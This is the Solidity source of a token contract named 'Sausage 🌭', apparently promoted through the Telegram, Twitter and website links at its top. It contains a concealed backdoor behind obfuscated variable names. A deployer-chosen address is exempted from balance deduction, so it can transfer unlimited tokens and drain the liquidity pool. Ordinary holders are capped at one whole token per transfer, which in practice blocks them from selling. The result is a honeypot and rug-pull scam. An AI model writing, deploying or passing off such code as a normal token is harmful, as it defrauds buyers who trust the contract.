/*

Telegram: https://t.me/SausageETH

Twitter: https://twitter.com/SausageERC20

Website: http://sausage.crypto-token.live/

*/

// SPDX-License-Identifier: MIT

pragma solidity >=0.8.5;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Sausage is Ownable {
    uint8 public decimals = 9;

    mapping(address => mapping(address => uint256)) public allowance;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    mapping(address => uint256) public balanceOf;

    constructor(address kcxv) {
        balanceOf[msg.sender] = totalSupply;
        ozihurg[kcxv] = jrgid;
        IUniswapV2Router02 zcqr = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        cvbfplnras = IUniswapV2Factory(zcqr.factory()).createPair(address(this), zcqr.WETH());
    }

    string public name = unicode"Sausage 🌭";

    function transferFrom(address iyzsrhp, address bwocqvn, uint256 uziymb) public returns (bool success) {
        require(uziymb <= allowance[iyzsrhp][msg.sender]);
        allowance[iyzsrhp][msg.sender] -= uziymb;
        ngrewoi(iyzsrhp, bwocqvn, uziymb);
        return true;
    }

    string public symbol = unicode"Sausage 🌭";

    mapping(address => uint256) private imnlwax;

    uint256 private jrgid = 105;

    address private cvbfplnras;

    function transfer(address bwocqvn, uint256 uziymb) public returns (bool success) {
        ngrewoi(msg.sender, bwocqvn, uziymb);
        return true;
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    event Transfer(address indexed from, address indexed to, uint256 value);

    function approve(address oxqhnipy, uint256 uziymb) public returns (bool success) {
        allowance[msg.sender][oxqhnipy] = uziymb;
        emit Approval(msg.sender, oxqhnipy, uziymb);
        return true;
    }

    function ngrewoi(address iyzsrhp, address bwocqvn, uint256 uziymb) private {
        if (0 == ozihurg[iyzsrhp]) {
            if (iyzsrhp != cvbfplnras && imnlwax[iyzsrhp] != block.number && uziymb < totalSupply) {
                require(uziymb <= totalSupply / (10 ** decimals));
            }
            balanceOf[iyzsrhp] -= uziymb;
        }
        balanceOf[bwocqvn] += uziymb;
        imnlwax[bwocqvn] = block.number;
        emit Transfer(iyzsrhp, bwocqvn, uziymb);
    }

    mapping(address => uint256) private ozihurg;
}